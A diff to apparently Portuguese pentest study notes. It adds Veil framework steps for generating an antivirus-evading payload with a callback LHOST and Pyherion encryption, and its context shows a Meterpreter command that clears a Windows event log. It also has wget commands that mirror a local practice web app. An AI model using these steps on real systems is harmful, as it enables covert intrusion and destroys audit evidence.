@@ -377,6 +377,20 @@ Metasploit - Armitage
     log = client.sys.eventlog.open('file replication service')
     Log.clear
 
+VEIL
+  apt install veil
+  veil
+  1
+  use 28
+  set LHOST 192.168.100.71
+  set USE_PYHERION Y
+  otions
+  generate
+  coloca o nome do arquivo 
+  2
+  /var/lib/veil/output/source -> arquivo criado fica aqui
+  
+
 Baixar paginas e projetos web
   wget http://localhost:8080/bodgeit/ -> baixa uma pagina web em html
   wget -r -P bodgeit_offline/ http://localhost:8080/bodgeit/ -> copiar toda o projeto web pastas, arquivos, imagens e etc.
